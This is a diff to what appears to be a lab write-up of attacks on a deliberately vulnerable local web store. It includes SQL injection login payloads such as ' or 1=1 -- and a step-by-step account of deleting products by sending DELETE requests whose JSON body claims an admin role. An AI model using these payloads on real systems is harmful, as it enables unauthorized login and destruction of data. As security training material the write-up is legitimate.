@@ -2,9 +2,12 @@
 
 ## Login Page SQL Injection:
 username:
-admin' or 1=1 --
+admin' --
 password:
 whatever_you_want
+
+or this username for testuser: 
+' or 1=1 --
 
 explanation:
 Classic SQLI, same solution as in our site
@@ -186,3 +189,69 @@ and we got its orders!!
         }
     ]
 }
+
+
+Broken Object Level Authorization:
+I went to the store catalog, clicked on a random product (laptop), and saw a GET api reqeust to 
+http://localhost:3001/api/products/7c23677e-a227-4b44-be6d-3117d912d884
+which is presumably /api/products/:id
+maybe It has other HTTP functions?
+
+Only other that HTTP Funcitons that worked to the same url was DELETE
+with  this error message:
+{
+    "success": false,
+    "message": "Cannot read properties of undefined (reading 'user')"
+}
+
+then I sent the same request with this body:
+{
+    "user" : 1
+}
+
+then i got this error : {
+    "success": false,
+    "message": "Cannot read properties of undefined (reading 'role')"
+}
+
+now i sent this message: 
+{
+    "user" : {
+        "role" : 1
+    }
+}
+
+now i got this error:
+{
+    "success": false,
+    "message": "Only admins can delete products"
+}
+
+maybe he wants me to have an admin role?
+I sent this delete
+{
+    "user" : {
+        "role" : "admin"
+    }
+}
+
+got { "statusCode": 500, "message": "Internal server error" }
+
+lets try do delete the product I created: 
+DELETE http://localhost:3001/api/products/84cd607e-e867-42e7-ba34-1ee3c74ba819
+{
+    "user" : {
+        "role" : "admin"
+    }
+}
+
+I got {
+    "success": true,
+    "message": "Product deleted successfully"
+}
+It was also deleted from the gui!
+this is the vuln.
+the server trusts the user input, without checking the token.
+these api rqeuests were sent trough postman with the `testuser` user token
+
+Weak/Predictable Password Reset Token (CWE-330)
